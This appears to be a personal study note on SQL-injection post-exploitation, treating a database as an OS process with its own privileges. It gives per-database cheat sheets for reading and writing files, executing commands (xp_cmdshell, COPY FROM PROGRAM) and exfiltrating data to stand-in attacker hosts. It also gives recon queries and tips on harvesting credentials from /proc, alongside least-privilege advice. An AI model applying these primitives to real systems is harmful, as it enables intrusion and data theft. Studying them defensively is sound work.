# Database as a Process (Not a Black Box)
Tags: #architecture #databases #post-exploitation #mental-model #day4

## The Rule

> "A database is a long-running OS process. It has a UID, a home directory, open file descriptors, and can fork child processes. SQL is just the API. Every capability the OS user has, every SQLi inherits."

The "database" abstraction is a layer the process exposes over a TCP socket — it is not a security boundary against the OS. Once you see this, every post-exploitation primitive (file read, file write, command execution) stops feeling like trivia and starts feeling obvious.

> "The exploitability of a SQLi is determined by the bug. The blast radius is determined by [[Principle of Least Privilege]]."

> "There are only four post-exploitation primitives — read file, write file, run command, dial out — and every database has all four. Different syntax, same architecture."

## Per-Database Cheat Sheets

### File Read

| Database | Syntax | Gate |
|---|---|---|
| **PostgreSQL** | `COPY t FROM '/etc/passwd';` / `lo_import()` / `pg_read_file()` | Superuser or `pg_read_server_files` |
| **MySQL** | `SELECT LOAD_FILE('/etc/passwd');` | `FILE` priv + `secure_file_priv` not set |
| **MSSQL** | `BULK INSERT` / `OPENROWSET(BULK ...)` | `ADMINISTER BULK OPERATIONS` |
| **Oracle** | `UTL_FILE.GET_LINE` / Java SP with `FileReader` | `UTL_FILE` access or Java perms |

### File Write

| Database | Syntax | Gate |
|---|---|---|
| **PostgreSQL** | `COPY (SELECT ...) TO '/path';` / `lo_export()` (binary) | Superuser |
| **MySQL** | `SELECT ... INTO OUTFILE '/path';` | `FILE` priv + empty `secure_file_priv` |
| **MSSQL** | `xp_cmdshell 'echo > file'` | Often skip to xp_cmdshell |
| **Oracle** | `UTL_FILE.PUT_LINE` / Java SP / external tables | DBA or `UTL_FILE` access |

### Command Execution

| Database | Syntax | Why it works |
|---|---|---|
| **PostgreSQL** | `COPY t FROM PROGRAM 'id';` / C extension via `LANGUAGE C` | Feature, not bug (CVE-2019-9193 = wontfix) |
| **MySQL** | UDF — write `.so` via `INTO OUTFILE`, `CREATE FUNCTION sys_exec` | `FILE` + writable plugin dir |
| **MSSQL** | `EXEC xp_cmdshell 'whoami';` / CLR assemblies | Disabled by default, commonly re-enabled |
| **Oracle** | `DBMS_SCHEDULER` / Java SP with `Runtime.exec()` / EXTPROC | Multiple paths |

### Outbound Network

| Database | Syntax | Channel |
|---|---|---|
| **PostgreSQL** | `COPY TO PROGRAM 'curl ...'` / `dblink(...)` | DNS/HTTP exfil, internal scan |
| **MySQL** | `LOAD_FILE('\\\\attacker\\share')` (Windows UNC) | DNS exfil |
| **MSSQL** | `xp_dirtree '\\\\attacker\\share'` / `xp_cmdshell 'curl'` | DNS leak |
| **Oracle** | `UTL_HTTP.REQUEST(...)` / `UTL_INADDR.GET_HOST_NAME(...)` | HTTP/DNS exfil |

## The Superuser Trust Boundary

Every cell is gated on a privilege: superuser, `FILE`, DBA role. The DB's threat model: "if you're superuser, you can do anything the OS user can." This is catastrophically wrong when applications connect with superuser credentials and have a concatenation SQLi. The trust chain collapses end-to-end.

## Post-SQLi Recon (First Queries)

```sql
SELECT current_user, current_setting('is_superuser');  -- PostgreSQL
SELECT user(), @@version, @@hostname;                  -- MySQL
SELECT SYSTEM_USER, @@VERSION, HOST_NAME();            -- MSSQL
```

If superuser/sysadmin → levels 2-5 are 60 seconds of typing. If not → look for privilege bug or misconfigured grant.

## Defensive Connection Strings to Look For

```
postgres://postgres:postgres@db/app     ← app AS superuser
mysql://root:root@db/app                ← same, MySQL
DATABASE_USERNAME=sa                    ← MSSQL sysadmin
ALTER USER app SUPERUSER;              ← migration elevating app role
GRANT pg_read_server_files TO app;     ← opens Level 2
```

Each is a finding before you've read any application code.

## What to Look For

- Check `application.properties` / env vars for superuser connection strings
- Ask: "What can the OS user this database runs as do?" — that's the blast radius ceiling
- `find / -user postgres -writable` shows webshell drop paths
- `/proc/<pid>/environ` shows AWS creds, JWT secrets in the process environment
- Container hardening (read-only root, dropped caps) narrows blast radius significantly

## My Notes
